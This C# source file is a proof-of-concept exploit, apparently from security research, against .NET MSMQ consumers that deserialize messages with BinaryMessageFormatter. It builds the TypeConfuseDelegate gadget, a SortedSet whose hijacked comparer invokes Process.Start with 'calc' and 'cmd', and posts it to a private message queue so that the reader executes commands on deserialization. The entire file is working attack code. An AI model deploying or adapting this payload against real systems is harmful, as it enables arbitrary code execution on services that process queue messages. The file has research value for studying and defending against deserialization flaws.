using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Messaging;

namespace MSMQ_Exploit
{
    //Nils Ole Timm of modzero GmbH 2020
    class Program
    {
        static void Main(string[] args)
        {
            //Setup message queue and use binaryformatter to format message
            MessageQueue q;
            if (MessageQueue.Exists(@".\Private$\Test"))
                q = MessageQueue.GetPrivateQueuesByMachine("localhost")[0];
            else
                q = MessageQueue.Create(@".\Private$\Test");
            //Must be same formatter as reader
            q.Formatter = new BinaryMessageFormatter();

            //Send payload to queue
            q.Send("Executing payload");
            q.Send(GeneratePayload());
        }


        //Standard TypeConfuseDelegate gadget with SortedSet`1
        //Triggers delegate execution on deserialization
        //More info at https://googleprojectzero.blogspot.com/2017/04/
        static object GeneratePayload()
        {
            Comparison<string> c = new Comparison<string>(string.Compare);
            var c2 = Func<string, string, int>.Combine(c, c);
            TypeConfuseDelegate(c2, new Func<string, string, Process>(Process.Start));
            Comparison<string> c3 = (Comparison<string>)c2;
            SortedSet<string> s = new SortedSet<string>(new string[] { "calc", "cmd" });
            FieldInfo fi = typeof(SortedSet<string>).GetField("comparer",
                BindingFlags.NonPublic | BindingFlags.Instance);
            fi.SetValue(s, Comparer<string>.Create(c3));
            return s;
        }

        //Runtime aware TypeConfuseDelegate Gadget
        static void TypeConfuseDelegate(Delegate handler, Delegate target)
        {
            FieldInfo fi;
            if (IsRunningOnMono())
                fi = typeof(MulticastDelegate).GetField("delegates",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            else
                fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = handler.GetInvocationList();
            if (IsRunningOnMono())
                invoke_list[0] = target;
            invoke_list[1] = target;
            fi.SetValue(handler, invoke_list);
        }

        public static bool IsRunningOnMono()
        {
            return Type.GetType("Mono.Runtime") != null;
        }
    }
}
